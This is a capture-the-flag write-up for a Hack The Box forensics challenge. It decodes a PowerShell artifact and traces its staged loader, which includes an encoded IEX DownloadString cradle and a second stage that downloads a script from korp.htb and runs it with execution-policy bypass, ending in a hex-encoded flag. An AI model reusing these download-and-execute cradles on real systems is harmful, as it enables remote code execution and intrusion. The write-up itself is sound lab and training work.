# Challenge
Thorin’s Amulet

Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened? Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.

``` bash
cat artifact.ps1           
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```

decoding the command
```bash
( New-Object Net.WebClient ).DownloadString("http://korp.htb/update")
```

host file
``` bash
83.136.251.68 korp.htb
```

``` bash
curl -v http://korp.htb:57732/update

* Host korp.htb:57732 was resolved.
* IPv6: (none)
* IPv4: 83.136.251.68
*   Trying 83.136.251.68:57732...
* Connected to korp.htb (83.136.251.68) port 57732
* using HTTP/1.x
> GET /update HTTP/1.1
> Host: korp.htb:57732
> User-Agent: curl/8.11.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: Werkzeug/3.1.3 Python/3.13.2
< Date: Sat, 22 Mar 2025 03:52:48 GMT
< Content-Disposition: inline; filename=update.ps1
< Content-Type: application/octet-stream
< Content-Length: 222
< Last-Modified: Wed, 26 Feb 2025 17:58:10 GMT
< Cache-Control: no-cache
< ETag: "1740592690.0-222-1138558671"
< Date: Sat, 22 Mar 2025 03:52:48 GMT
< Connection: close
< 
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```

```bash
$ curl -H "X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d" http://korp.htb:57732/a541a -o a541a.ps1

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   169  100   169    0     0    363      0 --:--:-- --:--:-- --:--:--   363
```

```bash
$ cat a541a.ps1 
$a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""
```

```python
# Hex-encoded string
hex_string = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"

# Convert hex string to ASCII text
decoded_flag = bytes.fromhex(hex_string).decode("utf-8")
print(decoded_flag)
```

```
HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}
```